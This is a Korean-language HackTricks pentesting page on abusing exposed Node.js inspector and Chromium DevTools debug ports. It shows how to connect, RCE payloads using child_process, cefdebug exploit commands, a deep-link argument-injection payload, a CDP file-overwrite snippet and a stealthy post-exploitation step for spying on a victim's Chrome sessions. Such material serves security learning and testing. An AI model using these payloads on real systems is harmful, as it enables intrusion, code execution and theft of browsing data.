# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

## 기본 정보

[문서에 따르면](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): `--inspect` 스위치와 함께 시작된 Node.js 프로세스는 debugging client의 연결을 기다립니다. **기본적으로**, 호스트와 포트 **`127.0.0.1:9229`**에서 연결을 기다립니다. 또한 각 프로세스에는 **고유한** **UUID**가 할당됩니다.<sup>[[4]](#references)</sup>

Inspector client가 연결하려면 호스트 주소, 포트 및 UUID를 알고 지정해야 합니다. 전체 URL은 다음과 같은 형태입니다: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> **debugger는 Node.js execution environment에 대한 full access 권한을 가지므로**, 이 포트에 연결할 수 있는 malicious actor는 Node.js 프로세스를 대신하여 arbitrary code를 실행할 수 있습니다(**potential privilege escalation**).

Inspector를 시작하는 방법은 여러 가지가 있습니다:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
검사 대상 프로세스를 시작하면 다음과 같은 내용이 표시됩니다:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
**CEF** (**Chromium Embedded Framework**) 기반 프로세스는 **debugger**를 열기 위해 `--remote-debugging-port=9222` 파라미터를 사용해야 합니다(SSRF 보호 기능은 매우 유사하게 유지됩니다). 그러나 **NodeJS** **debug** 세션을 제공하는 대신 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)을 사용해 브라우저와 통신합니다. 이는 브라우저를 제어하기 위한 인터페이스이지만 직접적인 RCE는 없습니다.<sup>[[5]](#references)</sup>

debug 모드로 브라우저를 시작하면 다음과 같은 내용이 표시됩니다:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets 및 same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

웹 브라우저에서 열리는 웹사이트는 브라우저 보안 모델에 따라 WebSocket 및 HTTP 요청을 보낼 수 있습니다. **고유한 debugger session id를 얻으려면** **초기 HTTP 연결**이 필요합니다. **same-origin-policy**는 웹사이트가 **이 HTTP 연결을** 생성하지 못하도록 **방지합니다**. [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**에** 대한 추가 보안을 위해 Node.js는 연결의 **'Host' headers**가 정확히 **IP address** 또는 **`localhost`** 또는 **`localhost6`** 중 하나를 지정하는지 확인합니다.<sup>[[12]](#references)</sup>

> [!TIP]
> 이 **security measure는** **HTTP request만 전송하여** inspector를 exploit하고 code를 실행하는 것을 방지합니다(SSRF vuln을 exploit하면 가능).

### 실행 중인 process에서 inspector 시작

실행 중인 nodejs process에 **signal SIGUSR1**을 전송하면 기본 port에서 **inspector를 시작**하도록 할 수 있습니다. 하지만 충분한 privileges가 필요하므로, 이는 **process 내부 정보에 대한 privileged access**를 부여할 수 있지만 직접적인 privilege escalation은 아닙니다.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> 이는 **process를 종료하고** `--inspect`와 함께 **새 process를 시작하는 것**이 **선택 사항이 아닌** 컨테이너에서 유용합니다. process와 함께 **container**도 **종료**되기 때문입니다.

### inspector/debugger에 연결

**Chromium 기반 browser**에 연결하려면 Chrome 또는 Edge에서 각각 `chrome://inspect` 또는 `edge://inspect` URL에 액세스할 수 있습니다. Configure 버튼을 클릭하여 **target host와 port**가 올바르게 나열되어 있는지 확인해야 합니다. 다음 이미지는 Remote Code Execution (RCE) 예시를 보여 줍니다.

![debugger에 액세스할 URL이 표시됩니다. 예: ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - inspector/debugger에 연결: **Chromium 기반 browser**에 연결하려면 ...](<../../images/image (674).png>)

**command line**을 사용하면 다음과 같이 debugger/inspector에 연결할 수 있습니다:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
도구 [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug)는 로컬에서 실행 중인 **inspectors**를 **찾고**, 해당 대상에 **code를 inject**할 수 있습니다.<sup>[[1]](#references)[[2]](#references)[[11]](#references)[[13]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)을 통해 브라우저에 연결된 경우 **NodeJS RCE exploits**가 작동하지 않는다는 점에 유의하세요(흥미로운 작업을 수행하려면 API를 확인해야 합니다).

## NodeJS Debugger/Inspector의 RCE

> [!TIP]
> [**Electron의 XSS에서 RCE를 얻는 방법을 찾고 있다면 이 페이지를 확인하세요.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

**Node inspector**에 **연결**할 수 있을 때 **RCE**를 얻는 일반적인 방법은 다음과 같은 것을 사용하는 것입니다(**Chrome DevTools protocol**에 연결할 때는 작동하지 않는 것으로 보입니다):<sup>[[3]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

API는 여기에서 확인할 수 있습니다: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)<sup>[[5]](#references)</sup>\
이 섹션에서는 사람들이 이 protocol을 exploit하는 데 사용한 흥미로운 방법을 나열하겠습니다.

### Deep Links를 통한 Parameter Injection

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)에서 Rhino security는 CEF 기반 application이 system에 custom UR**I** (workspaces://index.html)를 **등록**하여 전체 URI를 전달받은 다음, 해당 URI에서 일부 구성된 configuration으로 **CEF 기반 applicatio**n을 **실행**한다는 사실을 발견했습니다.<sup>[[8]](#references)</sup>

URI parameter가 URL decoded된 후 CEF 기반 application을 실행하는 데 사용되어, 사용자가 **`--gpu-launcher`** flag를 **command line**에 **inject**하고 임의의 작업을 실행할 수 있다는 사실이 밝혀졌습니다.

따라서 다음과 같은 payload를 사용할 수 있습니다:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
calc.exe를 실행합니다.

### 파일 덮어쓰기

**다운로드한 파일이 저장될 폴더**를 변경한 다음, 파일을 다운로드하여 애플리케이션에서 자주 사용되는 **소스 코드**를 **악성 코드**로 **덮어씁니다**.<sup>[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE and exfiltration

이 게시물에 따르면: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) theriver에서 RCE를 수행하고 내부 페이지를 exfiltrate할 수 있습니다.<sup>[[9]](#references)[[10]](#references)</sup>

### Post-Exploitation

실제 환경에서 **Chrome/Chromium 기반 browser를 사용하는 사용자 PC를 compromising한 후** **debugging이 활성화된 Chrome process를 실행하고 debugging port를 port-forward**하여 해당 process에 액세스할 수 있습니다. 이렇게 하면 **victim이 Chrome으로 수행하는 모든 작업을 inspect하고 민감한 정보를 steal**할 수 있습니다.<sup>[[7]](#references)</sup>

stealth 방식은 **모든 Chrome process를 terminate**한 다음 다음과 같은 명령을 호출하는 것입니다
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## 참고자료

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger inspection and exploitation tool](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Visual Studio Code Remote Code Execution via Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - Getting Started](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Abusing Chrome's Debugging Feature to Observe and Control Browsing Sessions Remotely](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - WebDriver RCE via DNS Rebinding and CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - From Bot to RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)

{{#include ../../banners/hacktricks-training.md}}
